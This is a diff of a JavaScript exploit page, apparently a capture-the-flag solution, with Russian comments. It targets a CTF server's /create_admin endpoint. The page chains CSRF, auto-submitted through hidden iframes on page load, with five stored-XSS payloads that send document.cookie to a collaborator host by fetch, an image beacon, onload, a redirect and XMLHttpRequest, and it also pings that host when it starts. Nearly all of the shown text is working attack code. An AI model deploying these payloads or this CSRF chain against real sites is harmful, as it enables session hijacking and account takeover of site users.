@@ -12,26 +12,26 @@
         const TARGET = 'http://tasks.goidactf.ru:20168';
         
         const timestamp = Date.now();
-        const login = `pwned${timestamp}`;
+        const login = 'pwned' + timestamp;
 
         // ==============================================
-        // XSS PAYLOAD ДЛЯ КРАЖИ COOKIE
+        // XSS PAYLOADS ДЛЯ КРАЖИ COOKIE
         // ==============================================
         
         // Payload 1: Простой fetch
-        const payload1 = `x<script>fetch('https://${COLLAB}/c1?c='+document.cookie)</script>`;
+        const payload1 = 'x<script>fetch("https://' + COLLAB + '/c1?c="+document.cookie)</script>';
         
         // Payload 2: Image beacon
-        const payload2 = `x<img src=x onerror="this.src='https://${COLLAB}/c2?c='+document.cookie">`;
+        const payload2 = 'x<img src=x onerror="this.src=\'https://' + COLLAB + '/c2?c=\'+document.cookie">';
         
-        // Payload 3: Через форму
-        const payload3 = `x<body onload="fetch('https://${COLLAB}/c3?c='+document.cookie)">`;
+        // Payload 3: Через body onload
+        const payload3 = 'x<body onload="fetch(\'https://' + COLLAB + '/c3?c=\'+document.cookie)">';
         
-        // Payload 4: Meta refresh с cookie в URL
-        const payload4 = `x<script>location='https://${COLLAB}/c4?c='+document.cookie</script>`;
+        // Payload 4: Location redirect
+        const payload4 = 'x<script>location="https://' + COLLAB + '/c4?c="+document.cookie</script>';
         
         // Payload 5: XMLHttpRequest
-        const payload5 = `x<script>var x=new XMLHttpRequest();x.open('GET','https://${COLLAB}/c5?c='+document.cookie);x.send()</script>`;
+        const payload5 = 'x<script>var x=new XMLHttpRequest();x.open("GET","https://' + COLLAB + '/c5?c="+document.cookie);x.send()</script>';
 
         // ==============================================
         // ОТПРАВКА PAYLOADS
@@ -39,8 +39,8 @@
         function sendPayload(payload, id) {
             const form = document.createElement('form');
             form.method = 'POST';
-            form.action = `${TARGET}/create_admin`;
-            form.target = `frame_${id}`;
+            form.action = TARGET + '/create_admin';
+            form.target = 'frame_' + id;
             
             const input = document.createElement('input');
             input.name = 'new_admin_login';
@@ -48,14 +48,14 @@
             form.appendChild(input);
             
             const iframe = document.createElement('iframe');
-            iframe.name = `frame_${id}`;
+            iframe.name = 'frame_' + id;
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
             document.body.appendChild(form);
             form.submit();
             
-            console.log(`[*] Sent payload ${id}:`, payload);
+            console.log('[*] Sent payload ' + id + ':', payload);
         }
 
         // ==============================================
@@ -64,17 +64,17 @@
         function exploit() {
             // Отправляем все варианты с задержкой
             sendPayload(payload1, 1);
-            setTimeout(() => sendPayload(payload2, 2), 500);
-            setTimeout(() => sendPayload(payload3, 3), 1000);
-            setTimeout(() => sendPayload(payload4, 4), 1500);
-            setTimeout(() => sendPayload(payload5, 5), 2000);
+            setTimeout(function() { sendPayload(payload2, 2); }, 500);
+            setTimeout(function() { sendPayload(payload3, 3); }, 1000);
+            setTimeout(function() { sendPayload(payload4, 4); }, 1500);
+            setTimeout(function() { sendPayload(payload5, 5); }, 2000);
             
             // Отправляем уведомление о старте
-            fetch(`https://${COLLAB}/started?t=${timestamp}`, {mode: 'no-cors'});
+            fetch('https://' + COLLAB + '/started?t=' + timestamp, {mode: 'no-cors'});
         }
 
         // Автозапуск
-        window.addEventListener('load', () => {
+        window.addEventListener('load', function() {
             setTimeout(exploit, 300);
         });
     </script>
